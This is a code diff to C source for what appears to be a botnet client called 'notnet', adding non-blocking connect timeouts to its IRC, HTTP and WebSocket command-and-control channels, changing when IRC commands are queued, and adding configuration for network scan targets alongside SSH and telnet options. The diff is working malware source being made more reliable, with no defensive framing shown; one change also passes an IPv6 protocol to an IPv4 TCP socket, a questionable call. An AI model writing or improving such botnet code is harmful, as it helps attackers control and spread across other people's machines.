@@ -21,7 +21,10 @@
 
 /* ── IRC Implementation ───────────────────────────────────────── */
 static int irc_create_socket(notnet_bot_t *bot) {
-    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IPV6);
+    if (sock < 0) {
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    }
     if (sock < 0) {
         log_error("IRC: socket() failed: %s", strerror(errno));
         return -1;
@@ -29,6 +32,10 @@ static int irc_create_socket(notnet_bot_t *bot) {
     
     int opt = 1;
     setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    
+    /* Set non-blocking for connect timeout */
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
     
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
@@ -45,11 +52,40 @@ static int irc_create_socket(notnet_bot_t *bot) {
     
     memcpy(&addr.sin_addr, he->h_addr, he->h_length);
     
-    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+    /* Non-blocking connect with select() timeout */
+    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+    if (connect_err < 0 && errno != EINPROGRESS) {
         log_error("IRC: connect() failed: %s", strerror(errno));
         close(sock);
         return -1;
     }
+    
+    /* Wait for connection with 3s timeout */
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 3;
+    tv.tv_usec = 0;
+    
+    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
+        log_error("IRC: connect() timed out");
+        close(sock);
+        return -1;
+    }
+    
+    /* Check for connect error */
+    int so_error;
+    socklen_t len = sizeof(so_error);
+    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
+    if (so_error != 0) {
+        log_error("IRC: connect() failed: %s", strerror(so_error));
+        close(sock);
+        return -1;
+    }
+    
+    /* Restore blocking mode for data transfer */
+    fcntl(sock, F_SETFL, flags);
     
     return sock;
 }
@@ -127,9 +163,15 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
         log_debug("IRC: ponged %s", host);
     }
     
-    /* Check for JOIN confirmation */
+    /* Check for JOIN confirmation (366 End of NAMES) */
     if (strstr(buf, "366")) {
         log_info("IRC: joined channel %s", bot->c2_irc.channel);
+        bot->c2_irc.authenticated = 1;
+    }
+    
+    /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode */
+    if (strstr(buf, "376")) {
+        log_info("IRC: MOTD complete, authenticated");
         bot->c2_irc.authenticated = 1;
     }
     
@@ -168,6 +210,10 @@ int http_connect(notnet_bot_t *bot) {
     int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock < 0) return -1;
     
+    /* Non-blocking connect */
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+    
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
@@ -181,10 +227,34 @@ int http_connect(notnet_bot_t *bot) {
     
     memcpy(&addr.sin_addr, he->h_addr, he->h_length);
     
-    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+    if (connect_err < 0 && errno != EINPROGRESS) {
         close(sock);
         return -1;
     }
+    
+    /* Wait with 3s timeout */
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 3;
+    tv.tv_usec = 0;
+    
+    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
+        close(sock);
+        return -1;
+    }
+    
+    int so_error;
+    socklen_t len = sizeof(so_error);
+    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
+    if (so_error != 0) {
+        close(sock);
+        return -1;
+    }
+    
+    fcntl(sock, F_SETFL, flags);
     
     bot->c2_http.sock = sock;
     bot->c2_http.connected = 1;
@@ -274,6 +344,10 @@ int ws_connect(notnet_bot_t *bot) {
     int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock < 0) return -1;
     
+    /* Non-blocking connect */
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+    
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
@@ -287,10 +361,34 @@ int ws_connect(notnet_bot_t *bot) {
     
     memcpy(&addr.sin_addr, he->h_addr, he->h_length);
     
-    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
+    if (connect_err < 0 && errno != EINPROGRESS) {
         close(sock);
         return -1;
     }
+    
+    /* Wait with 3s timeout */
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(sock, &fds);
+    tv.tv_sec = 3;
+    tv.tv_usec = 0;
+    
+    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
+        close(sock);
+        return -1;
+    }
+    
+    int so_error;
+    socklen_t len = sizeof(so_error);
+    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
+    if (so_error != 0) {
+        close(sock);
+        return -1;
+    }
+    
+    fcntl(sock, F_SETFL, flags);
     
     bot->c2_ws.sock = sock;
     bot->c2_ws.connected = 1;
@@ -371,12 +469,12 @@ int protocol_connect_all(notnet_bot_t *bot) {
 int protocol_process_commands(notnet_bot_t *bot) {
     char buf[1024];
     
-    /* Check IRC */
-    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
+    /* Check IRC - always read when connected, auth may not be set yet */
+    if (bot->c2_irc.connected) {
         int result = irc_read(bot, buf, sizeof(buf));
         if (result == 1) {
             /* New command in buffer - add to queue */
-            if (bot->cmd_count < 256) {
+            if (bot->cmd_count < 256 && bot->c2_irc.authenticated) {
                 snprintf(bot->cmd_queue[bot->cmd_count], 255, "%s", buf);
                 bot->cmd_count++;
             }
@@ -534,6 +632,10 @@ int load_config(notnet_bot_t *bot, const char *path) {
             bot->ssh_enabled = atoi(value);
         } else if (strcmp(key, "telnet_enabled") == 0) {
             bot->telnet_enabled = atoi(value);
+        } else if (strcmp(key, "scan_timeout_ms") == 0) {
+            bot->scan_timeout_ms = atoi(value);
+        } else if (strcmp(key, "scan_max_hosts") == 0) {
+            bot->scan_max_hosts = atoi(value);
         } else if (strcmp(key, "scan_targets") == 0) {
             /* Format: "192.168.1.0/24,10.0.0.0/24" or one per line with prefix "scan_target_X" */
             if (bot->scan_target_count < 16) {
@@ -548,6 +650,23 @@ int load_config(notnet_bot_t *bot, const char *path) {
                 strncpy(bot->scan_targets[idx], value, 255);
             }
         }
+    }
+    
+    /* Auto-detect enabled protocols from config */
+    if (bot->c2_irc.port != IRC_DEFAULT_PORT) {
+        bot->c2_enabled |= C2_IRC;
+        log_info("C2: IRC enabled (%s:%d)", bot->c2_irc.server, bot->c2_irc.port);
+    }
+    if (bot->c2_http.port != HTTP_DEFAULT_PORT) {
+        bot->c2_enabled |= C2_HTTP;
+        log_info("C2: HTTP enabled (%s:%d)", bot->c2_http.server, bot->c2_http.port);
+    }
+    if (bot->c2_ws.port != WS_DEFAULT_PORT) {
+        bot->c2_enabled |= C2_WS;
+        log_info("C2: WebSocket enabled (%s:%d)", bot->c2_ws.server, bot->c2_ws.port);
+    }
+    if (bot->c2_enabled == 0) {
+        log_info("C2: no protocols enabled (use irc_server/http_server/http_port)");
     }
     
     fclose(f);
